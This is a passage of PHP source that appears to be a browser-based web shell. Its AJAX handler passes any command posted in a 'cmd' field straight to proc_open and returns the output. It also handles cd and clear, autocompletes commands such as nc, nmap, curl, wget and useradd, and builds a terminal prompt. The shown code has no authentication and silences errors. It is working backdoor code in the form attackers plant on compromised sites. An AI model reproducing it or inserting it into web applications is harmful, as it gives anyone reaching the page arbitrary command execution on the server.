// ===== HANDLE AJAX =====
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    header('Content-Type: application/json');
    $cmd = $_POST['cmd'];
    $cwd = $_POST['cwd'] ?? getcwd();
    
    if (preg_match('/^cd\s*(.*)$/', $cmd, $m)) {
        $target = trim($m[1]) ?: ($_SERVER['HOME'] ?? '/tmp');
        $target = str_replace('~', $_SERVER['HOME'] ?? '/tmp', $target);
        if (file_exists($target) && is_dir($target)) {
            @chdir($target);
            $cwd = realpath($target);
        }
        echo json_encode(['output' => '', 'cwd' => $cwd, 'prompt' => generatePrompt($cwd)]);
        exit;
    }
    
    if (trim($cmd) === 'clear') {
        echo json_encode(['output' => '__CLEAR__', 'cwd' => $cwd, 'prompt' => generatePrompt($cwd)]);
        exit;
    }
    
    $origDir = getcwd();
    @chdir($cwd);
    
    $descriptorspec = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
    $env = $_SERVER;
    $env['PATH'] = '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin';
    $env['HOME'] = $home;
    $env['TERM'] = 'xterm-256color';
    
    $process = @proc_open($cmd . ' 2>&1', $descriptorspec, $pipes, $cwd, $env);
    $output = '';
    if (is_resource($process)) {
        @fclose($pipes[0]);
        $output = stream_get_contents($pipes[1]);
        @fclose($pipes[1]);
        proc_close($process);
    } else {
        $output = "bash: command not found: $cmd\n";
    }
    
    @chdir($origDir);
    echo json_encode(['output' => $output, 'cwd' => $cwd, 'prompt' => generatePrompt($cwd)]);
    exit;
}

// Handle autocomplete
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['autocomplete'])) {
    header('Content-Type: application/json');
    $partial = trim($_POST['partial']);
    $suggestions = [];
    
    $commands = ['ls','cd','cat','rm','mv','cp','mkdir','touch','chmod','ps','grep','find','echo','export','sudo','apt','curl','wget','nc','nmap','ping','ssh','python','python3','php','perl','ruby','node','npm','gcc','make','uname','df','du','mount','ifconfig','ip','systemctl','service','crontab','tar','gzip','zip','unzip','id','whoami','who','history','clear','help','exit','reset','free','lsof','netstat','route','iptables','base64','md5sum','sha256sum','strings','file','stat','ln','tee','xargs','awk','sed','cut','tr','diff','dmesg','lsblk','nano','vim','htop','top','kill','pkill','alias','unalias','type','which','whereis','su','passwd','useradd','dpkg','dnf','pacman','snap','scp','rsync','ftp','sftp','make','cmake','configure','pip','pip3','composer','cargo','go','rustc','figlet','neofetch','screenfetch'];
    
    if (!empty($partial)) {
        foreach ($commands as $cmd) {
            if (strpos($cmd, $partial) === 0) $suggestions[] = $cmd;
        }
        $files = @scandir($cwd ?? getcwd());
        if ($files) {
            foreach ($files as $file) {
                if ($file === '.' || $file === '..') continue;
                if (strpos($file, $partial) === 0) {
                    $suffix = (@is_dir(($cwd ?? getcwd()) . '/' . $file)) ? '/' : '';
                    if (!in_array($file . $suffix, $suggestions)) $suggestions[] = $file . $suffix;
                }
            }
        }
        sort($suggestions);
    }
    
    echo json_encode(array_slice($suggestions, 0, 50));
    exit;
}

$cwd = getcwd();

function generatePrompt($cwd) {
    global $username, $hostname;
    $home = $_SERVER['HOME'] ?? '/tmp';
    $displayPath = $cwd;
    if (strpos($cwd, $home) === 0) $displayPath = '~' . substr($cwd, strlen($home));
    return "{$username}@{$hostname}:{$displayPath}\$ ";
}
